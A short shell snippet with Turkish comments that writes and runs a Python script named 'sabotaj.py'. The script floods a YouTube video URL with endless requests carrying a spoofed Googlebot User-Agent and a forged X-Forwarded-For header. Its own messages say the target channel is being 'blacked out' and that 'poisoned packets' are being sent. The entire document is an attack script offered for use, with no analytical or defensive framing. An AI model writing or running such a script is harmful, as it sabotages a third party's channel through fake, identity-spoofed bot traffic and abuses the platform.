# Gerekli kütüphaneyi kuralım
pip install requests

# Bot dosyasını oluşturalım
cat <<EOF > sabotaj.py
import requests
import time

url = "https://youtu.be/B-G2eLRi_Xs"
headers = {
    "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "X-Forwarded-For": "1.1.1.1"
}

print("GitHub Bulut Gücü Devrede: Hedef Kanal Karartılıyor...")

while True:
    try:
        # YouTube'a 'bak ben bir botum' diyen istekler gönderir
        requests.get(url, headers=headers, timeout=5)
        print("Zehirli paket gönderildi!")
        time.sleep(0.1)
    except:
        pass
EOF

# Botu başlatalım
python3 sabotaj.py
